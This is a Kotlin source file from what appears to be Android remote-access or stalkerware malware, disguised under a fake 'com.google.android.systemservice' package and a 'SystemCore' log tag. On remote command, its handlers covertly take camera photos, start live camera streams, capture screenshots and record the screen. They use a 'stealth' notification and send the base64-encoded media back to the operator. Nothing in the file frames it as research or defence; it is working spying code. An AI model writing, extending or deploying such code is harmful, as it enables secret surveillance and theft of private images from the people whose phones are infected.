package com.google.android.systemservice.handlers

import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.core.content.ContextCompat
import com.google.android.systemservice.services.CameraService
import com.google.android.systemservice.services.LiveStreamingService
import com.google.android.systemservice.utils.StealthNotificationHelper
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class CameraHandlers(private val ctx: CommandContext) {
    companion object {
        private const val TAG = "SystemCore"
    }

    @Volatile private var screenRecordProcess: Process? = null
    @Volatile private var screenRecordFile: File? = null

    private fun sendError(message: String) {
        ctx.sendResponse("error", JSONObject().apply {
            put("error", message)
        })
    }

    fun executeStartCamera(params: JSONObject?) {
        val cameraId = params?.optString("camera_id", "0") ?: "0"
        val intent = Intent(ctx.appContext, CameraService::class.java).apply {
            action = "START_STREAM"
            putExtra("camera_id", cameraId)
        }
        ctx.appContext.startService(intent)
    }

    fun executeStopCamera() {
        val intent = Intent(ctx.appContext, CameraService::class.java).apply {
            action = "STOP_STREAM"
        }
        ctx.appContext.startService(intent)
    }

    @android.annotation.SuppressLint("MissingPermission")
    fun executeTakePhoto(params: JSONObject?) {
        val cameraId = params?.optString("camera_id", "0") ?: "0"
        ctx.scope.launch {
            try {
                if (ContextCompat.checkSelfPermission(ctx.appContext, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    ctx.sendResponse("photo", JSONObject().put("error", "CAMERA permission not granted"))
                    return@launch
                }

                // Upgrade foreground service type for Android 14+ to allow camera access
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                    try {
                        val notification = StealthNotificationHelper.createStealthNotification(ctx.appContext)
                        val type = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                        (ctx.appContext as? Service)?.startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification, type)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to upgrade foreground service: ${e.message}")
                    }
                }

                val manager = ctx.appContext.getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return@launch
                val characteristics = manager.getCameraCharacteristics(cameraId)
                val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                val largest = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
                    ?: Size(640, 480)

                val result = CompletableDeferred<ByteArray?>()
                val camThread = HandlerThread("CamCapture").also { it.start() }
                val camHandler = Handler(camThread.looper)

                val reader = ImageReader.newInstance(largest.width, largest.height, ImageFormat.JPEG, 2)
                reader.setOnImageAvailableListener({ r ->
                    val image = r.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()
                        result.complete(bytes)
                    } else {
                        result.complete(null)
                    }
                }, camHandler)

                var cameraDevice: CameraDevice? = null
                manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            val surface = reader.surface
                            camera.createCaptureSession(listOf(surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        try {
                                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                            captureBuilder.addTarget(surface)
                                            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
                                            session.capture(captureBuilder.build(), null, camHandler)
                                        } catch (e: Exception) {
                                            result.complete(null)
                                        }
                                    }
                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        result.complete(null)
                                    }
                                }, camHandler)
                        } catch (e: Exception) {
                            result.complete(null)
                        }
                    }
                    override fun onDisconnected(camera: CameraDevice) { camera.close(); result.complete(null) }
                    override fun onError(camera: CameraDevice, error: Int) { camera.close(); result.complete(null) }
                }, camHandler)

                val photoBytes = try {
                    withTimeoutOrNull(30000) { result.await() }
                } finally {
                    try { cameraDevice?.close() } catch (_: Exception) {}
                    try { reader.close() } catch (_: Exception) {}
                    camThread.quitSafely()
                }

                if (photoBytes != null && photoBytes.isNotEmpty()) {
                    val base64 = Base64.encodeToString(photoBytes, Base64.NO_WRAP)
                    ctx.sendResponse("photo", JSONObject().apply {
                        put("image_base64", base64)
                        put("camera_id", cameraId)
                        put("size", photoBytes.size)
                    })
                } else {
                    sendError("Failed to capture photo")
                }
            } catch (e: Exception) {
                sendError("Photo error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    fun executeStartLiveVideo(params: JSONObject?) {
        val cameraId = params?.optString("camera_id", "0") ?: "0"
        val intent = Intent(ctx.appContext, LiveStreamingService::class.java).apply {
            action = "START_VIDEO"
            putExtra("stream_type", cameraId)
        }
        ctx.appContext.startService(intent)
        ctx.sendResponse("live_video_started", JSONObject().apply {
            put("status", "started")
            put("camera_id", cameraId)
        })
        Log.d(TAG, "Started live video stream")
    }

    fun executeStopLiveVideo() {
        val intent = Intent(ctx.appContext, LiveStreamingService::class.java).apply {
            action = "STOP_VIDEO"
        }
        ctx.appContext.startService(intent)
        ctx.sendResponse("live_video_stopped", JSONObject().apply {
            put("status", "stopped")
        })
        Log.d(TAG, "Stopped live video stream")
    }

    fun executeTakeScreenshot() {
        ctx.scope.launch {
            var screenshotFile: File? = null
            try {
                withTimeout(10000) {
                    screenshotFile = File(ctx.appContext.externalCacheDir, "screenshot_${System.currentTimeMillis()}.png")
                    val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p", screenshotFile!!.absolutePath))

                    // Handle streams to prevent buffer blocking
                    process.inputStream.close()
                    process.errorStream.close()

                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        process.waitFor(8, java.util.concurrent.TimeUnit.SECONDS)
                    } else {
                        process.waitFor()
                    }
                    process.destroy()

                    if (screenshotFile!!.exists()) {
                        val bytes = screenshotFile!!.readBytes()
                        val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                        ctx.sendResponse("screenshot", JSONObject().apply {
                            put("image_base64", base64)
                            put("size", bytes.size)
                        })
                    } else {
                        sendError("Failed to capture screenshot")
                    }
                }
            } catch (e: Exception) {
                sendError("Screenshot error: ${(e.message ?: "Unknown error")}")
            } finally {
                screenshotFile?.delete()
            }
        }
    }

    fun executeStartScreenRecord(params: JSONObject?) {
        ctx.scope.launch {
            try {
                val duration = params?.optInt("duration", 30) ?: 30
                screenRecordProcess?.destroy()
                val recordFile = File(ctx.appContext.externalCacheDir, "recording_${System.currentTimeMillis()}.mp4")
                screenRecordFile = recordFile
                screenRecordProcess = Runtime.getRuntime().exec(arrayOf(
                    "screenrecord",
                    "--time-limit", duration.toString(),
                    recordFile.absolutePath
                ))
                ctx.sendResponse("screen_record_started", JSONObject().apply {
                    put("status", "recording")
                    put("duration", duration)
                })
            } catch (e: Exception) {
                sendError("Screen record start error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    fun executeStopScreenRecord() {
        ctx.scope.launch {
            try {
                screenRecordProcess?.destroy()
                screenRecordProcess?.waitFor(5, TimeUnit.SECONDS)

                val file = screenRecordFile
                if (file != null && file.exists()) {
                    val bytes = file.readBytes()
                    val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                    ctx.sendResponse("screen_record", JSONObject().apply {
                        put("video_base64", base64)
                        put("size", bytes.size)
                    })
                    file.delete()
                } else {
                    sendError("Recording file not found")
                }
            } catch (e: Exception) {
                sendError("Screen record stop error: ${(e.message ?: "Unknown error")}")
            }
        }
    }
}
